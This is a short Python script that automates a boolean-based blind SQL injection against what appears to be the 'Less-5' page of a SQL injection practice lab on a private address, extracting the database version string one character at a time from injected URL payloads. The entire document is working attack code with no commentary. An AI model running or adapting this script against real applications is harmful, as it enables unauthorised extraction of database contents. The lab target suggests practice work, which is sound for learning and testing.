import requests

def check(url):
    #print("> " + url)
    return_txt = requests.get(url).text
    if (return_txt.find ("You are in") != -1):
        return True
    return False

guessed_str = ""
for index in range(1,100):
    founded = False

    for x in range(0,128):
        req_url = "http://192.168.19.174:32772/Less-5/index.php?id=0' or ascii(substr(version(),%s,1)) = %s -- -" % (index,x)
        if check(req_url) :
            guessed_str +=chr(x)
            founded = True
            if (x == 0):
                founded = False
            print(guessed_str)
            continue

    if not founded:
        print("---------------------- Return --------------------")
        print(guessed_str)
        print("--------------------------------------------------")
        break
